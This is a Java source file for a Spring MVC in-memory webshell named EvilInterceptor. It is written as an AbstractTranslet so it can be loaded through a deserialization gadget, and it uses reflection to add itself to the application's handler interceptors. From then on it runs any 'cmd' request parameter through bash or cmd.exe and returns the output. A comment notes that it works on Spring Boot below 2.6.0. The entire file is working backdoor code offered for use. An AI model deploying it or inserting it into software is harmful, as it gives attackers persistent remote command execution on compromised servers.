package cn.org.unk.memshell.spring;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import sun.reflect.ReflectionFactory;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.List;


/*
    <dependency>
      <groupId>org.springframework</groupId>
      <artifactId>spring-webmvc</artifactId>
      <version>5.2.5.RELEASE</version>
    </dependency>

    <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>javax.servlet-api</artifactId>
      <version>3.1.0</version>
    </dependency>


使用条件：
    springboot < 2.6.0
 */
public class EvilInterceptor extends AbstractTranslet implements HandlerInterceptor {
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object getFieldValue(Object obj,String fieldname) throws Exception{
        Field field = getField(obj.getClass(), fieldname);
        Object o = field.get(obj);
        return o;
    }

    public EvilInterceptor() throws Exception{
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        List<HandlerInterceptor> adaptInterceptors = (List<HandlerInterceptor>)getFieldValue(mappingHandlerMapping,"adaptedInterceptors");
        adaptInterceptors.add(this);
    }
    @Override
    public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                java.io.PrintWriter printWriter = response.getWriter();ProcessBuilder builder;String o = "";
                if (System.getProperty("os.name").toLowerCase().contains("win"))
                {
                    builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                }
                java.util.Scanner c = new java.util.Scanner(builder.start().getInputStream()).useDelimiter("\\A");o = c.hasNext() ? c.next(): o;c.close();printWriter.println(o);printWriter.flush();printWriter.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }
    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler,modelAndView);
    }
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler,
                ex);
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws
            TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) throws TransletException {
    }
}
